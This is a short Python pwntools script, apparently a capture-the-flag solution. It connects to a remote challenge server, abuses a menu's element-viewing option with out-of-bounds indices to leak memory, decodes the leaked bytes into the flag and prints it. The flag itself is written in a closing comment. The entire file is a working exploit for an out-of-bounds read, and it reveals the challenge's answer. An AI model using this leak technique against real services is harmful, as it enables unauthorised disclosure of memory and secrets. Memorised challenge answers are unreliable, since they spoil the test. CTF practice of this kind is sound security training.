from pwn import *

p = remote("eth007.me",42044)

def view_element(idx: int):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    leak = hex(int(p.recvline().strip(b'\n'),base=16))[2:]
    return leak

flag = ""
raw = ""
for i in range(16,21):
    temp = view_element(i)
    raw = temp + raw
raw = raw[3:]
for j in range(0,len(raw),2):
    hex_str = chr(int(raw[j:j+2],16))
    flag = hex_str + flag

log.success("Flag: %s", flag)
p.interactive()
#Flag = ictf{oob_means_danger_2fb9184a}